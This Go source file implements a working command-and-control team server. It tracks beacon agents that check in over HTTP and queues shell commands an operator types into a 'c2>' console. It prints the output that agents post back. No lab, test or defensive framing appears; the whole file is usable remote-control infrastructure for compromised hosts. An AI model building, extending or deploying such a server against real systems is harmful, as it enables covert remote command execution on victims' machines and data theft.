package main

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/chzyer/readline"
)

// --- Data Structures ---

// BeaconTask represents a command queued for a specific beacon to execute.
type BeaconTask struct {
	TaskID  string `json:"task_id"`
	Command string `json:"command"`
}

// BeaconResponse represents the result of an executed command.
type BeaconResponse struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
	Error  string `json:"error"`
}

// Agent represents an active connection/beacon.
type Agent struct {
	ID        string
	Hostname  string
	IP        string
	LastSeen  time.Time
	TaskQueue []BeaconTask
}

// Global State
var (
	agents      = make(map[string]*Agent)
	agentsMutex sync.Mutex
	serverPort  = ":8080"
)

// --- HTTP Handlers ---

// handleCheckin allows a beacon to announce itself and request tasks.
func handleCheckin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := r.Header.Get("X-Agent-ID")
	hostname := r.Header.Get("X-Hostname")

	if agentID == "" {
		http.Error(w, "Missing Agent ID", http.StatusBadRequest)
		return
	}

	agentsMutex.Lock()
	defer agentsMutex.Unlock()

	// Register or update the agent
	agent, exists := agents[agentID]
	if !exists {
		// New Agent
		agent = &Agent{
			ID:        agentID,
			Hostname:  hostname,
			IP:        strings.Split(r.RemoteAddr, ":")[0],
			TaskQueue: []BeaconTask{},
		}
		agents[agentID] = agent
		log.Printf("\n[+] New Agent Registered: %s (%s) from %s\n", agent.ID, agent.Hostname, agent.IP)
	}

	agent.LastSeen = time.Now()

	// Check for tasks
	if len(agent.TaskQueue) > 0 {
		task := agent.TaskQueue[0]
		agent.TaskQueue = agent.TaskQueue[1:] // Pop

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(task)
		return
	}

	// No tasks
	w.WriteHeader(http.StatusNoContent)
}

// handleResults allows a beacon to post the output of an executed task.
func handleResults(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	agentID := r.Header.Get("X-Agent-ID")
	if agentID == "" {
		http.Error(w, "Missing Agent ID", http.StatusBadRequest)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read body", http.StatusInternalServerError)
		return
	}
	defer r.Body.Close()

	var result BeaconResponse
	if err := json.Unmarshal(body, &result); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	agentsMutex.Lock()
	if agent, exists := agents[agentID]; exists {
		agent.LastSeen = time.Now()
	}
	agentsMutex.Unlock()

	fmt.Printf("\n\n[*] Result from %s (Task %s):\n", agentID, result.TaskID)
	if result.Error != "" {
		fmt.Printf("Error: %s\n", result.Error)
	} else {
		fmt.Printf("%s\n", result.Output)
	}
	fmt.Print("c2> ") // Re-prompt

	w.WriteHeader(http.StatusOK)
}

// --- Console UI ---

func startConsole() {
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          "c2> ",
		HistoryFile:     "/tmp/c2_history.tmp",
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		panic(err)
	}
	defer rl.Close()

	var activeAgent *Agent

	for {
		if activeAgent != nil {
			rl.SetPrompt(fmt.Sprintf("\033[31m%s\033[0m c2> ", activeAgent.ID[:8]))
		} else {
			rl.SetPrompt("c2> ")
		}

		line, err := rl.Readline()
		if err != nil { // EOF or Ctrl+C
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		args := strings.Split(line, " ")
		cmd := args[0]

		switch cmd {
		case "exit", "quit":
			fmt.Println("Exiting C2 Server...")
			os.Exit(0)
		case "agents":
			agentsMutex.Lock()
			fmt.Println("--- Active Agents ---")
			for id, ag := range agents {
				status := "ALIVE"
				if time.Since(ag.LastSeen) > 30*time.Second {
					status = "DEAD"
				}
				fmt.Printf("[%s] ID: %s | Host: %s | IP: %s | Last Seen: %v\n", status, id, ag.Hostname, ag.IP, time.Since(ag.LastSeen).Round(time.Second))
			}
			agentsMutex.Unlock()
		case "interact":
			if len(args) < 2 {
				fmt.Println("Usage: interact <Agent ID>")
				break
			}
			agentsMutex.Lock()
			ag, exists := agents[args[1]]
			agentsMutex.Unlock()
			if !exists {
				fmt.Println("Error: Agent not found.")
			} else {
				activeAgent = ag
				fmt.Printf("Interacting with Agent %s\n", activeAgent.ID)
			}
		case "back":
			activeAgent = nil
		default:
			// If not a built-in command, assume it's a task for the active agent
			if activeAgent == nil {
				fmt.Println("Unknown command. Type 'agents' or 'interact <id>'.")
				continue
			}

			task := BeaconTask{
				TaskID:  fmt.Sprintf("%d", time.Now().UnixNano()),
				Command: line,
			}

			agentsMutex.Lock()
			activeAgent.TaskQueue = append(activeAgent.TaskQueue, task)
			agentsMutex.Unlock()

			fmt.Printf("Task %s queued for %s\n", task.TaskID, activeAgent.ID)
		}
	}
}

func main() {
	// Setup HTTP Server
	mux := http.NewServeMux()
	mux.HandleFunc("/checkin", handleCheckin)
	mux.HandleFunc("/results", handleResults)

	fmt.Printf("[*] Starting HTTP Team Server on port %s\n", serverPort)
	go func() {
		if err := http.ListenAndServe(serverPort, mux); err != nil {
			log.Fatalf("Server failed: %v", err)
		}
	}()

	// Start Operator Console
	time.Sleep(100 * time.Millisecond) // Give server time to start logs
	startConsole()
}
